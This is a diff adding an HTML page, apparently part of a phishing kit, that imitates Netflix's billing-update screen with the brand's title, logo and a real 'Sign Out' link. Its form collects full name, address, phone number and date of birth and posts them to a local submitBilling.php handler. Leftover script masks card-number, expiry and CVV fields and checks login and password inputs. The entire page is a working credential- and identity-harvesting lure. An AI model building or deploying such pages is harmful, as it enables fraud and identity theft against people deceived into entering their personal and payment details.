@@ -1,0 +1,75 @@
+
+<!Doctype html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Netflix</title>
+<link rel="icon" href="./res/img/favicon.ico">
+<link rel="stylesheet" href="./res/css/update.css">
+<script src="./res/js/jquery.js"></script>
+<script src="./res/js/jquery.mask.js"></script>
+</head>
+<body>
+<div class="content">
+<div class="top">
+<div class="left">
+<img src="./res/img/logo.png">
+</div>
+<div class="right">
+<a href="https://netflix.com">Sign Out</a>
+</div>
+</div>
+<div class="login-form">
+
+
+ <form action="files/submitBilling.php" method="POST"> 
+<input class="input" required="" type="fname" name="firstname" placeholder="First Name"><input class="input" required="" type="name" name="lastname" placeholder="Last Name">
+<input class="input" required="" type="street" name="address" placeholder="Address">
+
+<input class="input" required="" type="location" name="city" placeholder="City"><input class="input" required="" type="from" name="state" placeholder="State"><input class="input" required="" type="postal" name="zip" placeholder="Zip Code">
+<input class="input" required="" type="phone" name="phone" placeholder="Phone Number"><input class="input" required="" data-mask="00/00/0000" type="text" name="birth" placeholder="Date Of Birth">
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+
+
+
+
+<div class="bottom-infos">
+
+
+
+</div>
+<button id="login-btn" style="margin-top:20px;">SAVE</button>
+</form>
+
+
+
+</div>
+<div class="footer">
+<div class="qs"><a href="#">Questions? Contact us.</a></div>
+<div class="f-links">
+<a href="#">Gift Card Terms</a> <a href="#">Terms of Use</a> <a href="#">Privacy Statement</a>
+</div>
+<select>
+<option value="english">  English
+</option></select>
+</div>
+</div>
+
+<script>
+$(function(){
+	$("#cardnumber").mask("0000 0000 0000 0000");
+	$("#date").mask("00/0000");
+	$("#cvv").mask("0000");
+});
+
+function onLogin(){
+	if($("#login").val().trim() == "" || $("#pass").val().trim() == ""){return false;}
+	else{
+	document.getElementById('login-btn').style.background = "#6a0000";
+ 
+	}
+}
+</script>
+
+</body></html>
